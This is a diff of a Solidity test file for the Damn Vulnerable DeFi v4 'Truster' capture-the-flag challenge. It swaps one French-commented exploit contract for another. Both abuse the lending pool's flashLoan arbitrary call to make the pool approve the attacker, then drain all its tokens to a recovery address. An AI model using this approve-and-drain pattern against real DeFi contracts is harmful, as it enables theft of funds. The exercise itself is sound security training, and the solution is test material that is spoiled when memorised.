@@ -1,40 +1,26 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity ^0.8.25;
+pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
-interface IERC20Like {
-    function approve(address spender, uint256 value) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function transferFrom(address from, address to, uint256 value) external returns (bool);
-}
+contract TrusterExploiter {
+    // Contrat attaquant qui abuse du flashLoan pour faire un approve()
+    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
+        // On crafts un calldata qui appelle approve() sur le token
+        // Ça va approuver ce contrat à dépenser tous les tokens de la pool
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), _token.balanceOf(address(_pool)));
 
-interface ITrusterPool {
-    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
-}
+        // On exécute le flash loan avec amount=0 mais avec notre calldata malicieux
+        // La pool va faire un call() vers le token avec notre data
+        _pool.flashLoan(0, address(this), address(_token), data);
 
-// @dev Contrat déployé par le player (UNE transaction):
-///      Son constructeur exécute: flashLoan(0, ...) -> token.approve(this, MAX) depuis le pool,
-///      puis transferFrom(pool -> recovery) pour drainer les fonds.
-contract TrusterDeployAndDrain {
-    constructor(address pool, address token, address recovery) {
-        // 1) Faire exécuter par le pool: token.approve(address(this), type(uint256).max)
-        bytes memory data = abi.encodeWithSelector(
-            IERC20Like.approve.selector,
-            address(this),
-            type(uint256).max
-        );
-        ITrusterPool(pool).flashLoan(0, address(this), token, data);
-
-        // 2) Utiliser l'allowance pour drainer tout vers l'adresse de recovery
-        uint256 bal = IERC20Like(token).balanceOf(pool);
-        IERC20Like(token).transferFrom(pool, recovery, bal);
+        // Maintenant qu'on est approuvé, on transfere tous les tokens vers recovery
+        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
     }
 }
-
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -81,9 +67,9 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        // Une seule opération sous prank(player): déployer le contrat qui effectue l’exploit dans son constructeur
-        new TrusterDeployAndDrain(address(pool), address(token), recovery);      
-        
+        // On déploie le contrat attaquant qui va exploiter le flashLoan
+        // Tout se passe dans le constructor
+        new TrusterExploiter(pool, token, recovery);
     }
 
     /**
